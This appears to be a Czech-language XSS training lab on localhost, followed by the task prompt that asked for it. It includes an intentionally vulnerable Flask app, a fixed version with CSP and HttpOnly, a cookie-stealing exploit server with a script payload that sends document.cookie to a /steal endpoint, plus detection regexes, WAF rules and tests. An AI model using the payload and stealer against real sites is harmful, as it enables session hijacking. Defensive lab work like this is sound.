python
Kopírovat
from flask import Flask, request, make_response
app = Flask(__name__)
@app.route('/')
def index():
# Zranitelnost: Vrací vstup uživatele bez sanitace (XSS)
user_name = request.args.get('name', 'Host')
resp = make_response(f"<h1>Ahoj {user_name}</h1><p>Moje tajná data jsou v cookies.</p>")
# CHYBA: Chybí HttpOnly a Secure příznaky
resp.set_cookie('session_id', 'SECRET_SESSION_TOKEN_12345')
return resp
if __name__ == '__main__':
app.run(port=5000)
target/secure_app.py
python
Kopírovat
from flask import Flask, request, make_response, render_template_string
from flask_talisman import Talisman
app = Flask(__name__)
# CSP: Povoluje skripty pouze z vlastní domény
csp = {'default-src': "'self'"}
Talisman(app, content_security_policy=csp)
@app.route('/')
def index():
user_name = request.args.get('name', 'Host')
# OBRANA: Automatické escapování v šabloně
resp = make_response(render_template_string("<h1>Ahoj {{ name }}</h1>", name=user_name))
# OBRANA: HttpOnly (zakáže JS), SameSite (proti CSRF)
resp.set_cookie('session_id', 'SECRET_SESSION_TOKEN_12345',
httponly=True, secure=False, samesite='Strict')
return resp
if __name__ == '__main__':
app.run(port=5001)
exploit/exploit.py
python
Kopírovat
import http.server
import socketserver
import urllib.parse
PORT = 8080
class CookieStealer(http.server.BaseHTTPRequestHandler):
def do_GET(self):
if "/steal" in self.path:
query = urllib.parse.urlparse(self.path).query
params = urllib.parse.parse_qs(query)
cookie = params.get('c', ['N/A'])[0]
print(f"\n[!] ÚSPĚCH! Ukradená cookie: {cookie}\n")
self.send_response(200)
self.end_headers()
self.wfile.write(b"Data prijata.")
else:
# Payload pro oběť (XSS)
payload = "<script>fetch('http://localhost:8080/steal?c=' + document.cookie);</script>"
print(f"[*] Payload připraven: {payload}")
self.send_response(200)
self.end_headers()
self.wfile.write(f"Zranitelný odkaz: http://localhost:5000/?name={payload}".encode())
print(f"[*] Útočný server běží na portu {PORT}")
with socketserver.TCPServer(("", PORT), CookieStealer) as httpd:
httpd.serve_forever()
defense/detect.py
python
Kopírovat
import time
import re
LOG_FILE = "access.log" # Simulovaný log
def analyze_logs():
print("[*] Monitoring logů spuštěn...")
# Simulované vzory útoků
xss_pattern = re.compile(r"(<script|fetch|document\.cookie)", re.IGNORECASE)
while True:
try:
with open(LOG_FILE, "r") as f:
lines = f.readlines()
for line in lines:
if xss_pattern.search(line):
print(f"[!] ALERT: Detekován pokus o XSS! Log: {line.strip()}")
time.sleep(5)
except FileNotFoundError:
time.sleep(1)
if __name__ == "__main__":
analyze_logs()
defense/waf_rules.txt
text
Kopírovat
# ModSecurity / WAF Rules PoC
# 1. Blokuj document.cookie v URL parametrech
SecRule ARGS "(document\.cookie|fetch\(|XMLHttpRequest)" "id:1001,phase:2,deny,status:403,msg:'Pokus o kradez cookies'"
# 2. Blokuj tagy <script>
SecRule ARGS "(<script>|<\/script>)" "id:1002,phase:2,deny,status:403,msg:'XSS Injection detected'"
# 3. Vynuť HttpOnly v hlavičkách odpovědi (pokud aplikace selže)
Header edit Set-Cookie ^(.*)$ $1;HttpOnly;Secure
tests/test_security.py
python
Kopírovat
import requests
import unittest
class TestSecurity(unittest.TestCase):
def test_vulnerable_app_cookie_access(self):
# Testuje, zda je cookie v nechráněné aplikaci přístupná (nemá HttpOnly)
r = requests.get("http://localhost:5000/")
cookie = r.cookies.get_policy()._cookies['localhost']['/']['session_id']
self.assertFalse(cookie.has_nonstandard_attr('HttpOnly'), "Vulnerable app by mela mit HttpOnly=False")
def test_secure_app_cookie_protection(self):
# Testuje, zda bezpečná aplikace má HttpOnly
r = requests.get("http://localhost:5001/")
cookie = r.cookies.get_policy()._cookies['127.0.0.1']['/']['session_id']
self.assertTrue(cookie.has_nonstandard_attr('HttpOnly'), "Secure app MUSÍ mít HttpOnly")
def test_csp_header_exists(self):
r = requests.get("http://localhost:5001/")
self.assertIn('Content-Security-Policy', r.headers)
if __name__ == '__main__':
print("[*] Spouštím bezpečnostní testy...")
unittest.main()
6. 💡 Doporučení
Priorita 1: Nasadit HttpOnly na všechny session cookies (Okamžitě).
Priorita 2: Implementovat striktní Content-Security-Policy (CSP) pro zamezení exfiltrace.
Priorita 3: Aktivovat EDR pravidla pro monitoring neobvyklého přístupu k souborům prohlížeče v %AppData%.

## TVOJE ÚKOLY:
1. Vytvoř zranitelnou aplikaci (Target) — jednoduchý server na localhost
2. Vytvoř útočný skript (Exploit) — funkční PoC
3. Vytvoř obranné mechanismy (Defense) — opravená verze + detekce
4. Vytvoř automatické testy, které:
   a) Spustí zranitelnou aplikaci
   b) Spustí exploit — ověří že útok funguje
   c) Spustí opravenou aplikaci
   d) Spustí exploit znovu — ověří že obrana funguje
5. Všechno musí běžet na localhost (127.0.0.1) v Termux

## FORMÁT ODPOVĚDI (JSON):